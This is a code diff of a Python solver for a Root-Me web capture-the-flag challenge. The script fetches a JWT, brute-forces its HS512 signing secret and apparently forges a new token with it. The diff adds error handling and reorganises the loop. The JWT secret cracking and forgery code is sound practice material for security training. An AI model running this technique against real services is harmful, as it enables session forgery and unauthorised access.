@@ -1,15 +1,19 @@
-#
+# http://challenge01.root-me.org/web-serveur/ch59
 
 import json
 
 import jwt
 import requests
-from jwt.exceptions import InvalidSignatureError
+
+# from jwt.exceptions import InvalidSignatureError
 
 
 def get_token() -> str:
-    response = requests.get("http://challenge01.root-me.org/web-serveur/ch59/token")
-    token = json.loads(response.text)["Here is your token"]
+    try:
+        response = requests.get("http://challenge01.root-me.org/web-serveur/ch59/token")
+        token = json.loads(response.text)["Here is your token"]
+    except requests.exceptions.RequestException as e:
+        raise SystemExit(e)
 
     return token
 
@@ -40,10 +44,10 @@ def brute_secret(token) -> str:
             jwt.decode(token, secret, algorithms=["HS512"])
             print(f"Secret is {secret}!")
 
-        except InvalidSignatureError:
+        except jwt.exceptions.InvalidSignatureError:
             continue
 
-    return secret
+        return secret
 
 
 def hack_token(secret: str) -> str:
